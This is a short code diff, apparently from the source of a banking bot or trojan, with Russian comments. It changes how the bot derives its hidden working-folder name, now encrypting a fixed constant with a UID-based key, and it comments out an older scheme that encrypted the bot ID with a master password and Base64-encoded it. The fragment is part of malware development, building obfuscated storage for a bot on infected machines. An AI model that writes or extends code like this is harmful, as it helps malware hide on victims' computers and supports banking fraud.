@@ -36,15 +36,33 @@ DWORD BotExeNameHash = 0;
 //через функцию SetBankingMode()
 char BOT_UID[128];
 
+
+
 PCHAR BotGetWorkFolder()
 {
 	// Функция возвращает рабочий каталог бота (короткое имя)
-	// Имя папки получаем из уида бота, который прогоняется ключём шифрования
+
 	if (!STR::IsEmpty(BOT_WORK_FOLDER_NAME))
 		return BOT_WORK_FOLDER_NAME;
 
+	// Генерируем имя на основе константы обработанной ключём из уида
+	const static char WorkPath[] = "WnsBMT";
+
+	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath, false);
+
+	// Копируем путь в глобальный массив
+	const char *Buf = (Name) ? Name : WorkPath;
+
+	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));
+
+	m_memcpy(BOT_WORK_FOLDER_NAME, Buf, ToCopy);
+	BOT_WORK_FOLDER_NAME[ToCopy] = 0;
+
+	STR::Free(Name);
+
+
 	// Получаем уид и шифруем его
-	PCHAR UID = GenerateBotID();
+/*	PCHAR UID = GenerateBotID();
 
     PCHAR Password = GetMainPassword(true);
 
@@ -76,6 +94,8 @@ PCHAR BotGetWorkFolder()
 	STR::Free(UID);
 	MemFree(Encrypted);
 	STR::Free(B64);
+
+	*/
 
 	// Расчитываем хэш
 	BotWorkPathHash = CalcHash(BOT_WORK_FOLDER_NAME);
